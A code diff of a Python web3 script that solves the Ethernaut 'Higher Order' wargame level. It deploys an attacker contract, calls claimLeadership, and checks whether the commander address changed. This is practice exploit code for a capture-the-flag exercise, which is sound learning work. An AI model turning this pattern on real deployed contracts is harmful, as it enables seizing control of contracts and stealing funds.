@@ -8,7 +8,7 @@ dict_output = dotenv_values(ENV_PATH)
 
 RPC_URI = dict_output['WEB3_PROVIDER_URI']
 
-CONTRACT_ADDRESS = '0x4F57F9239eFCBf43e5920f579D03B3849C588396'
+CONTRACT_ADDRESS = '0x09601fBa6C50825Ff4A95112008311e21f3f24d9'
 LEVEL_ADDRESS = '0x' + dict_output['ETHERNAUT_LEVEL30_ADDRESS']
 PRIVATE_KEY = '0x' + dict_output['USER_ADDRESS_PRIVATE_KEY']
 
@@ -22,6 +22,63 @@ else:
     
 PA = web3.eth.account.from_key(PRIVATE_KEY)
 USER_ADDRESS = PA.address
+
+CONTRACT_ABI = [
+    {
+        "type": "function",
+        "name": "claimLeadership",
+        "inputs": [],
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "signature": "0x5b3e8fe7"
+    },
+    {
+        "type": "function",
+        "name": "commander",
+        "inputs": [],
+        "outputs": [
+            {
+                "name": "",
+                "type": "address",
+                "internalType": "address"
+            }
+        ],
+        "stateMutability": "view",
+        "constant": True,
+        "signature": "0x37270936"
+    },
+    {
+        "type": "function",
+        "name": "registerTreasury",
+        "inputs": [
+            {
+                "name": "",
+                "type": "uint8",
+                "internalType": "uint8"
+            }
+        ],
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "signature": "0x211c85ab"
+    },
+    {
+        "type": "function",
+        "name": "treasury",
+        "inputs": [],
+        "outputs": [
+            {
+                "name": "",
+                "type": "uint256",
+                "internalType": "uint256"
+            }
+        ],
+        "stateMutability": "view",
+        "constant": True,
+        "signature": "0x61d027b3"
+    }
+]
+
+contract = web3.eth.contract(address=CONTRACT_ADDRESS, abi=CONTRACT_ABI)
 
 with open("./contract/HigherOrderAttack.sol", "r") as f:
     ATTACKER_SRC_DATA = f.read()
@@ -46,6 +103,14 @@ ATTACKER_ADDRESS = receipt.contractAddress
 
 attacker = web3.eth.contract(address=ATTACKER_ADDRESS, abi=ATTACKER_ABI)
 
+print("---- BEFORE TRNASACTION ----")
+
+BEFORE_COMMANDER = contract.functions.commander().call()
+BEFORE_TREASURY = contract.functions.treasury().call()
+
+print(f"Commander address : {BEFORE_COMMANDER}")
+print(f"Treasury : {BEFORE_TREASURY}\n")
+
 data = {
     "from": USER_ADDRESS,
     "gasPrice": web3.to_wei(0.000001, "ether"),
@@ -62,4 +127,31 @@ print(f"Transaction Hash: {web3.to_hex(tx_hash)}")
 receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
 print(f"Transaction Receipt: {receipt}\n")
 
-print("---- ATTACK FINISHED ----")
+data = {
+    "from": USER_ADDRESS,
+    "gasPrice": web3.to_wei(0.000001, "ether"),
+    "nonce": web3.eth.get_transaction_count(USER_ADDRESS),
+}
+
+tx = contract.functions.claimLeadership().build_transaction(data)
+
+signed_tx = web3.eth.account.sign_transaction(tx, PRIVATE_KEY)
+tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)
+
+print(f"Transaction Hash: {web3.to_hex(tx_hash)}")
+
+receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
+print(f"Transaction Receipt: {receipt}\n")
+
+print("---- AFTER TRNASACTION ----")
+
+AFTER_COMMANDER = contract.functions.commander().call()
+AFTER_TREASURY = contract.functions.treasury().call()
+
+print(f"Commander address : {AFTER_COMMANDER}")
+print(f"Treasury : {hex(AFTER_TREASURY)}\n")
+
+if BEFORE_COMMANDER != AFTER_COMMANDER:
+    print("ATTACK SUCCESS!")
+else:
+    print("ATTACK FAILED...")
